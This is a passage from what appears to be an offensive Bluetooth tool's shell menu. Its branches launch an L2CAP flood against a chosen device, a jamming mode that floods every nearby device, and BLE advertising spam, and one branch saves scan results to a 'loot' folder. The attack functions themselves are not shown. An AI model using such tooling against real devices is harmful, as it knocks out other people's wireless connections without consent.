        run_disrupt
        ;;
    f*)
        TARGET=$(ask "Target MAC (from a scan)" "")
        [ -z "$TARGET" ] && die "A target MAC is required for flood."
        is_valid_mac "$TARGET" || die "'$TARGET' doesn't look like a MAC address (expected aa:bb:cc:dd:ee:ff) - check for a typo."
        DURATION=$(ask "Duration in seconds (blank = until Ctrl+C)" "")
        [ -n "$DURATION" ] && case "$DURATION" in *[!0-9]*) die "'$DURATION' isn't a whole number of seconds." ;; esac
        say "This L2CAP-floods a specific Bluetooth device - a real denial-of-service against it."
        confirm "Only run this against your own devices or ones you're authorized to test. Proceed?" || die "Aborted."
        run_flood
        ;;
    j*)
        SCAN_TIME=$(ask "Scan time before jamming starts (seconds)" "15")
        case "$SCAN_TIME" in ''|*[!0-9]*) die "'$SCAN_TIME' isn't a whole number of seconds." ;; esac
        BURST=$(ask "Flood duration per device, per rotation (seconds)" "$BURST")
        case "$BURST" in ''|*[!0-9]*) die "'$BURST' isn't a whole number of seconds." ;; esac
        DURATION=$(ask "Duration in seconds (blank = until Ctrl+C)" "")
        [ -n "$DURATION" ] && case "$DURATION" in *[!0-9]*) die "'$DURATION' isn't a whole number of seconds." ;; esac
        say "This scans, then L2CAP-floods EVERY Bluetooth device it finds nearby."
        confirm "Only run this in an area/against devices you're authorized to test. Proceed?" || die "Aborted."
        run_jam_area
        ;;
    a*)
        DURATION=$(ask "Duration in seconds (blank = until Ctrl+C)" "")
        [ -n "$DURATION" ] && case "$DURATION" in *[!0-9]*) die "'$DURATION' isn't a whole number of seconds." ;; esac
        say "This floods the area with fake BLE advertising packets - can disrupt nearby BLE scanning/pairing."
        confirm "Only run this in an area/against devices you're authorized to test. Proceed?" || die "Aborted."
        run_advspam
        ;;
    *)
        DURATION=$(ask "Scan duration (seconds)" "15")
        case "$DURATION" in ''|*[!0-9]*) die "'$DURATION' isn't a whole number of seconds." ;; esac
        if confirm "Also do a BLE scan?"; then DO_BLE=1; fi
        mkdir -p "$LOOT_DIR"
        stamp=$(date +%Y%m%d-%H%M%S 2>/dev/null || echo scan)
        out="$LOOT_DIR/scan-${stamp}.txt"
        say "Classic scan (${DURATION}s)..."
        { timeout "$DURATION" hcitool scan --flush 2>&1 || true; } | tee "$out"
        if [ "$DO_BLE" = "1" ]; then
            say "BLE scan (${DURATION}s)..."
            echo "-- BLE --" >> "$out"
            { timeout "$DURATION" hcitool lescan 2>&1 || true; } | tee -a "$out"
        fi
        say "Saved to $out"
        ;;
esac
